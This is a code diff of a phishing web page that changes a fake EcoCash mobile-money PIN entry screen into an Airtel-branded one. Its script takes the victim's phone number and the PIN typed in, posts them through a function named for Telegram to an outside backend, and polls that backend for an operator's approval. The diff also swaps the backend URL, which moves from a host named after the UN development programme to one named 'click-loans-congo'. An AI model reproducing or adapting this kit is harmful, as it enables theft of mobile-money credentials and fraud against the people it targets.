@@ -6,170 +6,132 @@
 <title>EcoCash | Enter PIN</title>
 
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
 }
 
-body {
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  background: #f0f4f8;
-  min-height: 100vh;
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:#f2f2f2;
+  min-height:100vh;
 }
 
-/* ===== CONTAINER ===== */
-.container {
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-  overflow: hidden;
+/* MAIN CONTAINER */
+.container{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
 }
 
-/* ===== WHITE SECTION ===== */
-.upper-section {
-  background: #ffffff;
-  padding: 48px 24px 110px;
-  text-align: center;
-  position: relative;
-  z-index: 2;
+/* UPPER SECTION */
+.upper-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  background:transparent;
 }
 
-/* CURVE */
-.upper-section::after {
-  content: "";
-  position: absolute;
-  bottom: -48px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 140%;
-  height: 96px;
-  background: #ffffff;
-  border-radius: 0 0 100% 100%;
+/* BRAND NAME (AIRTEL STYLE) */
+.brand-name{
+  font-size:42px;
+  font-weight:600;
+  color:#e60000;
+  margin-bottom:12px;
 }
 
-/* Branding */
-.brand-name {
-  font-size: 40px;
-  font-weight: 900;
-  letter-spacing: -1px;
-  margin-bottom: 10px;
+/* Welcome */
+.welcome-text{
+  font-size:22px;
+  color:#555;
+  margin-bottom:18px;
 }
 
-.eco { color: #0c5ba8; }
-.cash { color: #e53935; }
-
-.welcome-text {
-  font-size: 20px;
-  color: #555;
-  margin-bottom: 6px;
+/* PHONE DISPLAY */
+.phone-display{
+  width:100%;
+  padding:16px;
+  border:2px solid #e60000;
+  border-radius:14px;
+  font-size:18px;
+  text-align:center;
+  color:#333;
+  background:#fff;
+  margin-bottom:26px;
 }
 
-.phone-display {
-  border: none;
-  background: none;
-  text-align: center;
-  font-size: 17px;
-  color: #777;
-  width: 100%;
-  margin-bottom: 40px;
+/* PIN LABEL */
+.pin-label{
+  font-size:17px;
+  color:#666;
+  margin-bottom:18px;
 }
 
-/* PIN */
-.pin-label {
-  font-size: 17px;
-  color: #666;
-  margin-bottom: 26px;
+/* PIN BOXES */
+.pin-boxes{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  margin-bottom:16px;
 }
 
-.pin-boxes {
-  display: flex;
-  justify-content: center;
-  gap: 18px;
+.pin-boxes input{
+  width:58px;
+  height:58px;
+  border:2px solid #e60000;
+  border-radius:12px;
+  font-size:24px;
+  text-align:center;
+  outline:none;
+  background:#fff;
 }
 
-.pin-boxes input {
-  width: 56px;
-  height: 56px;
-  border: 2px solid #0c5ba8;
-  border-radius: 12px;
-  font-size: 22px;
-  text-align: center;
-  outline: none;
-  caret-color: transparent;
+/* STATUS */
+#status{
+  font-size:14px;
+  color:#e60000;
+  margin-top:8px;
+  min-height:18px;
 }
 
-#status {
-  margin-top: 12px;
-  font-size: 14px;
-  color: #e53935;
-  min-height: 18px;
+/* LOWER SECTION */
+.lower-section{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  margin-top:28px;
 }
 
-/* ===== BLUE SECTION ===== */
-.lower-section {
-  background: #0c5ba8;
-  color: #ffffff;
-  padding: 96px 24px 32px;
-  margin-top: -48px;
-  position: relative;
-  z-index: 1;
-
-  flex: 1;
-  display: flex;
-  flex-direction: column;
+/* REGISTER / HELP BUTTONS */
+.action-buttons{
+  display:flex;
+  gap:12px;
+  justify-content:center;
+  margin-bottom:26px;
 }
 
-/* 🔥 CENTER BLOCK */
-.blue-center {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;   /* vertical center */
-  align-items: center;       /* horizontal center */
+.action{
+  flex:1;
+  background:#e60000;
+  color:#fff;
+  padding:14px;
+  border-radius:10px;
+  font-weight:600;
 }
 
-/* text */
-.instruction {
-  text-align: center;
-  font-size: 15px;
-  line-height: 1.4;
-  margin-bottom: 28px;
+/* FOOTER */
+.footer{
+  font-size:14px;
+  color:#666;
 }
 
-/* buttons */
-.action-buttons {
-  display: flex;
-  gap: 16px;
-  justify-content: center;
-}
-
-.action {
-  flex: 1;
-  max-width: 160px;
-  background: #ffffff;
-  color: #0c5ba8;
-  padding: 14px;
-  border-radius: 14px;
-  font-weight: 600;
-  text-align: center;
-}
-
-/* footer */
-.footer {
-  margin-top: auto;
-  text-align: center;
-  font-size: 13px;
-  opacity: 0.9;
-}
-
-.footer .version {
-  margin-bottom: 6px;
-}
-
-.footer a {
-  color: #ffffff;
-  text-decoration: underline;
+.footer a{
+  color:#666;
+  text-decoration:underline;
 }
 </style>
 </head>
@@ -178,13 +140,14 @@ body {
 
 <div class="container">
 
-  <!-- WHITE -->
   <div class="upper-section">
+
     <div class="brand-name">
-      <span class="eco">Eco</span><span class="cash">Cash</span>
+      Airtel
     </div>
 
     <div class="welcome-text">Welcome</div>
+
     <input class="phone-display" id="phoneDisplay" readonly>
 
     <div class="pin-label">Enter your PIN</div>
@@ -197,38 +160,24 @@ body {
     </div>
 
     <div id="status"></div>
+
   </div>
 
-  <!-- BLUE -->
   <div class="lower-section">
 
-    <!-- 🔥 CENTERED CONTENT -->
-    <div class="blue-center">
-      <p class="instruction">
-        To register an EcoCash wallet or get assistance,<br>
-        click below
-      </p>
-
-      <div class="action-buttons">
-        <div class="action">Register</div>
-        <div class="action">Help & Support</div>
-      </div>
+    <div class="action-buttons">
+      <div class="action">Login</div>
     </div>
 
-    <!-- FOOTER -->
     <div class="footer">
-      <div class="version">v3.0.2P</div>
-      <div>
-        By signing in you agree to the
-        <a href="#">Terms and Conditions</a>
-      </div>
+      By continuing, you agree to the Terms and Conditions
     </div>
 
   </div>
 
 </div>
 
-<!-- 🔒 SCRIPT UNTOUCHED -->
+<!-- SCRIPT UNCHANGED -->
 <script>
 document.getElementById("phoneDisplay").value =
   localStorage.getItem("phone") || "Unknown Number";
@@ -238,7 +187,7 @@ const boxes = document.querySelectorAll(".pin-boxes input");
 const statusEl = document.getElementById("status");
 
 async function sendPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://united-nations-development-program.onrender.com";
+  const BACKEND_URL = "https://click-loans-congo.onrender.com";
   try {
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
       method: "POST",
@@ -252,7 +201,7 @@ async function sendPinToTelegram(name, phone, pin) {
 }
 
 async function pollPinApproval(requestId) {
-  const BACKEND_URL = "https://united-nations-development-program.onrender.com";
+  const BACKEND_URL = "https://click-loans-congo.onrender.com";
   return new Promise(resolve => {
     const i = setInterval(async () => {
       const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
